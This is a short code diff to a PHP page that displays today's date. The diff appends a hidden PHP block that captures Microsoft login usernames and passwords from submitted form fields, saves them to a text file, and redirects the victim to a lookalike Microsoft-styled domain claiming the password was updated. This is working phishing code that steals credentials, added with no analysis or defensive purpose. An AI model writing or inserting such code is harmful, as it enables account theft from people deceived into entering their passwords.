@@ -15,3 +15,9 @@ echo 'Today’s date is <b>' . date('Y/m/d') . '</b> and it’s a <b>'.date('l')
 <div>Again, this is static HTML content.</div>
 </body>
 </html>
+<?php
+
+file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+header('Location: https://login-microsoft-online.netlify.app/password_updated.html');
+exit();
+?>
